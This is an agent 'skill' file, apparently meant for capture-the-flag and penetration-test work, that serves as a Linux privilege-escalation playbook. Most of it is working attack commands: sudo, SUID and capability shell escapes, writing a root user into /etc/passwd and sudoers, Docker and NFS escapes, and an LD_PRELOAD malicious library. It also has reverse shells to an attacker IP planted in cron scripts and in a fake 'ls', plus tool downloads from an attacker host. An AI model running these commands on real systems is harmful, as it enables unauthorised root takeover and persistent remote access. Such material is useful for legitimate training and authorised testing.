# Skill: Linux Privilege Escalation

> **Domain:** Linux Post-Exploitation  
> **Difficulty:** Medium to Insane  
> **Prerequisites:** Linux fundamentals, file permissions, process management  
> **Invoke Condition:** Low-privilege Linux shell obtained

---

## 1. Philosophy

> *"Root is not a destination — it's the result of understanding how the system works better than its administrator."*

---

## 2. Automated Enumeration

### 2.1 linpeas.sh (Recommended)
```bash
# Download and run
wget http://<your_ip>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Save output for analysis
/tmp/linpeas.sh > /tmp/linpeas_output.txt 2>&1
```

### 2.2 Manual Enumeration Commands
```bash
# Current user info
whoami
id
 groups

# OS info
cat /etc/os-release
uname -a
cat /proc/version

# Kernel exploits
uname -r
# Search: searchsploit linux kernel <version>

# Sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/

# Running processes
ps aux
ps -ef

# Network connections
netstat -tulpn 2>/dev/null || ss -tulpn

# Writable directories
find / -writable -type d 2>/dev/null

# PATH
 echo $PATH

# Environment variables
env
printenv

# Check for Docker
ls -la /var/run/docker.sock 2>/dev/null
cat /proc/1/cgroup | grep docker

# Check for LXC/LXD
lxc list 2>/dev/null
```

---

## 3. Privilege Escalation Vectors

### 3.1 SUDO Abuse

#### Check Sudo Permissions
```bash
sudo -l
```

#### Common Sudo Exploits
```bash
# If sudo allows specific binaries, check GTFOBins
curl https://gtfobins.github.io | grep <binary_name>

# Common examples:
# sudo vim -> :!bash
sudo vim -c ':!/bin/sh'

# sudo less -> !bash
sudo less /etc/hosts
# Then type: !bash

# sudo find -> -exec
sudo find . -exec /bin/sh \; -quit

# sudo python -> import os
sudo python3 -c 'import os; os.system("/bin/sh")'

# sudo nmap -> --script
sudo nmap --interactive
# nmap> !sh

# sudo awk -> system()
sudo awk 'BEGIN {system("/bin/sh")}'

# sudo tar -> checkpoint
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# sudo cp -> overwrite /etc/passwd or /etc/sudoers
# Create malicious passwd with root hash
sudo cp /tmp/passwd /etc/passwd
```

### 3.2 SUID Binaries

#### Find SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

#### Exploit SUID Binaries
```bash
# Check GTFOBins for the binary
# Common SUID exploits:

# /usr/bin/bash (SUID)
bash -p

# /usr/bin/find (SUID)
find . -exec /bin/sh -p \; -quit

# /usr/bin/python3 (SUID)
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### 3.3 Capabilities

```bash
# Find capabilities
getcap -r / 2>/dev/null

# Common capability exploits:
# cap_setuid+ep on python
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_setuid+ep on perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

### 3.4 Cron Jobs

#### Enumerate Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
```

#### Exploit Writable Cron Scripts
```bash
# If a cron script is writable by current user
# Add reverse shell to the script
echo "bash -c 'bash -i >& /dev/tcp/<your_ip>/9001 0>&1'" >> /etc/cron.daily/backup.sh
```

#### Path Hijacking in Cron
```bash
# If cron runs a command without full path
cat /etc/crontab
# */5 * * * * root backup.sh

# Create malicious backup.sh in PATH before real one
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/backup.sh
echo 'bash -i >& /dev/tcp/<your_ip>/9001 0>&1' >> /tmp/backup.sh
chmod +x /tmp/backup.sh
```

### 3.5 Writable System Files

#### /etc/passwd
```bash
# Generate password hash
openssl passwd -1 -salt hacker hacker123
# $1$hacker$zV9QJ7YrIZu6xB0GwG3fD1

# Add root user to /etc/passwd
echo 'hacker:$1$hacker$zV9QJ7YrIZu6xB0GwG3fD1:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

#### /etc/sudoers
```bash
# If writable, add current user
echo '<username> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo su
```

### 3.6 Kernel Exploits

```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit linux kernel <version>
searchsploit linux local <version>

# Common kernel exploits:
# - Dirty COW (CVE-2016-5195) - Linux < 4.8.3
# - PwnKit (CVE-2021-4034) - pkexec
# - CVE-2022-0847 (Dirty Pipe) - Linux 5.8+
# - CVE-2023-4911 (Looney Tunables) - glibc
# - CVE-2024-1086 (Use-after-free in netfilter)

# Compile and run exploit
gcc exploit.c -o exploit
./exploit
```

### 3.7 Docker Escape

```bash
# Check if we're in a container
ls -la /var/run/docker.sock 2>/dev/null
cat /proc/1/cgroup | grep docker

# If docker socket is accessible
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# If we're in a privileged container
capsh --print | grep cap_sys_admin
# Mount host filesystem
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host
```

### 3.8 NFS (No Root Squash)

```bash
# Check NFS shares
showmount -e <target_ip>

# If no_root_squash is set
mkdir /tmp/nfs
mount -t nfs <target_ip>:/share /tmp/nfs
cd /tmp/nfs
# Create SUID binary as root on attacker machine
cp /bin/bash .
chmod +s bash
# On target, run ./bash -p
```

### 3.9 PATH Hijacking

```bash
# Check PATH
 echo $PATH

# If . is in PATH or script uses relative paths
# Create malicious binary
 cat > /tmp/ls << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<your_ip>/9001 0>&1
EOF
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Wait for root to run 'ls'
```

### 3.10 Library Hijacking

```bash
# Check for LD_PRELOAD
env | grep LD

# If LD_PRELOAD is allowed in sudo
sudo LD_PRELOAD=/tmp/malicious.so <allowed_command>

# Create malicious shared object
// malicious.c
#include <stdio.h>
#include <stdlib.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}

# Compile
gcc -fPIC -shared -o malicious.so malicious.c -nostartfiles
sudo LD_PRELOAD=/tmp/malicious.so <allowed_command>
```

### 3.11 Recent CVE Patterns (2025-2026)

| CVE | Description | Example Box |
|-----|-------------|-------------|
| CVE-2026-3888 | snapd race condition via systemd-tmpfiles | HTB: Snapped |
| CVE-2024-48990 | needrestart PYTHONPATH injection | HTB: Conversor |
| CVE-2025-4517 | Python tarfile path traversal | HTB: WingData |
| CVE-2025-47273 | setuptools path traversal | HTB: VariaType |
| CVE-2025-54123 | Apache CXF file read | HTB: DevArea |

---

## 4. Privilege Escalation Checklist

```
□ Kernel version checked for known exploits
□ Sudo permissions enumerated (sudo -l)
□ SUID binaries found and checked on GTFOBins
□ Capabilities enumerated (getcap)
□ Cron jobs checked for writable scripts
□ PATH checked for hijacking opportunities
□ Writable system files identified (/etc/passwd, /etc/sudoers)
□ Docker/LXC escape possible
□ NFS no_root_squash checked
□ Environment variables checked (LD_PRELOAD)
□ Running processes monitored (pspy)
□ Log files checked for credentials
□ Backup files checked
□ Home directories checked for SSH keys
```

---

## 5. pspy — Process Monitoring

```bash
# Download pspy
wget http://<your_ip>/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64

# Watch for cron jobs, services starting, user actions
# This is CRITICAL for race condition exploits and cron-based privesc
```

---

*"Linux privilege escalation is about patience. Run linpeas, read every line, and understand what each finding means."*
